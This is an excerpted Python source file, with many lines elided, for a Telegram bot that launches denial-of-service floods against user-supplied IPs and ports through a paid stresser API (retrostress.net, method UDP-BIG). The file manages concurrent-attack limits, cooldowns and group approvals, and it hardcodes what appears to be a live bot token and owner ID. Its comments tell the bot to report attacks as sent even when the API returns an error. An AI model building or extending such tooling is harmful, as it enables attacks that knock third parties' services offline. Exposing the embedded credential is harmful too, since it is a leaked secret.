...
# ================= CONFIG =================
BOT_TOKEN = "8792796962:AAG2oWiuCXr8LRFCGVcHzJgPVc5eopUxOJo"
BOT_OWNER = 1783291270
...
def get_group_limits(chat_id):
    try:
        ...
        return 4, get_setting("max_attack_time", DEFAULT_MAX_ATTACK_TIME), get_setting("cooldown", DEFAULT_COOLDOWN)
    except:
        return 4, DEFAULT_MAX_ATTACK_TIME, DEFAULT_COOLDOWN
...
def execute_attack(target, port, duration):
    ...
    # API format: https://retrostress.net/api/start?key=KEY&target=IP&port=PORT&time=TIME&method=UDP-BIG
    ...
    # If we got any response (even error), attack was sent
    # Return a success response so bot doesn't show error
...
def start_attack(target, port, duration, message, attack_id, cooldown_seconds):
    try:
        ...
        # Always consider attack successful if we got a response (API sends attack even if response is not 200)
        # The API is working, we just need to handle the response better
        attack_sent = True
    ...
    try:
        ...
        if is_owner(user_id):
            welcome_msg = (
                ...
                f"╚════════════════════════╝\n\n"
                f"📊 <b>Bot Status:</b>\n"
                f"• Active Attacks: {get_active_attack_count()}/{get_setting('max_concurrent_attacks', 4)}\n"
    ...
    try:
        ...
        if is_owner(user_id):
            help_text = (
                ...
                f"• /setconcurrent &lt;num&gt; - Max concurrent (1-4)\n"
...
def ping_command(message):
    try:
        ...
        max_conc = get_setting("max_concurrent_attacks", 4)
...
def handle_attack(message):
    try:
        ...
        max_concurrent_global = get_setting("max_concurrent_attacks", 4)
...
def generate_status_text(user_id=None):
    active_count = get_active_attack_count()
    max_global = get_setting('max_concurrent_attacks', 4)
    ...
    text += (
        f"┌─ <b>BOT SETTINGS</b>\n"
        f"├ 🔢 Max Concurrent: {get_setting('max_concurrent_attacks', 4)}\n"
    ...
    try:
        ...
        if len(parts) < 5:
            bot.reply_to(message, 
                        ...
                        "Example: /approve -1001234567890 4 400 60\n\n"
                        "📋 <b>Parameters:</b>\n"
                        "• group_id: Group ID (negative number)\n"
                        "• concurrent: Max attacks at once (1-4)\n"
        ...
        if max_concurrent < 1 or max_concurrent > 4:
            bot.reply_to(message, "❌ Concurrent attacks must be between 1 and 4.")
            return
...
def server_stats_command(message):
    try:
        ...
        stats_text = (
            ...
            f"━━━━━━━ <b>BOT</b> ━━━━━━━\n"
            f"🔥 <b>Active Attacks:</b> {active_attacks}/{get_setting('max_concurrent_attacks', 4)}\n"
...
def set_concurrent_command(message):
    try:
        ...
        if value < 1 or value > 4:
            bot.reply_to(message, "❌ Value must be between 1 and 4.")
            return
        
        old_value = get_setting("max_concurrent_attacks", 4)
...
if __name__ == "__main__":
    ...
    logger.info(f"Max Concurrent: {get_setting('max_concurrent_attacks', 4)}")
